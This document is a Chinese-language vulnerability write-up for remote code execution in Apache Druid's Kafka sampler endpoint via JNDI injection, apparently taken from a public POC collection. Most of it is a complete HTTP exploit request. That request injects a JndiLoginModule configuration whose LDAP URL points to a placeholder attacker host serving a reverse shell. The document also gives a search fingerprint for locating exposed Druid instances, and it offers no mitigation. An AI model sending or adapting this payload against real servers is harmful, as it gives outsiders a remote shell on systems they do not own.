# Apache Druid sampler kafka 远程命令执行漏洞

## 漏洞描述

Apache Druid 支持从 Kafka 加载数据，恶意的攻击者可通过修改 Kafka 连接配置属性，从而进一步触发 JNDI 注入攻击，最终攻击者可在服务端执行任意恶意代码，获取系统服务权限。

## 漏洞影响

<a-checkbox checked>Apache Druid </a-checkbox></br>

## 网络测绘

<a-checkbox checked>title_string = "Apache Druid"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1682919141181-6c39b2c9-e803-4fa3-af91-4c933f863780.png)

验证POC

```python
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 1392
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close  

{
    "type":"kafka",
    "spec":{
            "type":"kafka",
            "ioConfig":{
                "type":"kafka",
                "consumerProperties":{
                    "bootstrap.servers":"6.6.6.6:9092",
                    "sasl.mechanism":"SCRAM-SHA-256",
                    "security.protocol":"SASL_SSL",
                    "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://xxx.xxx.xxx.xxx:1389/Basic/ReverseShell/xxx.xxx.xxx.xxx/8373\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
                },
                "topic":"any",
                "useEarliestOffset":true,
                "inputFormat":{
                    "type":"regex",
                    "pattern":"([\\s\\S]*)",
                    "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                    "columns":[
                            "raw"
                    ]
                }
            },
            "dataSchema":{
                "dataSource":"sample",
                "timestampSpec":{
                    "column":"!!!_no_such_column_!!!",
                    "missingValue":"1970-01-01T00:00:00Z"
                },
                "dimensionsSpec":{        

                },
                "granularitySpec":{
                    "rollup":false
                }
            },
            "tuningConfig":{
                "type":"kafka"
            }
    },
    "samplerConfig":{
            "numRows":500,
            "timeoutMs":15000
    }
}
```

![img](../../../.vuepress/public/img/1682919248408-90090556-799e-4a7a-9d54-d6ef94541686.png)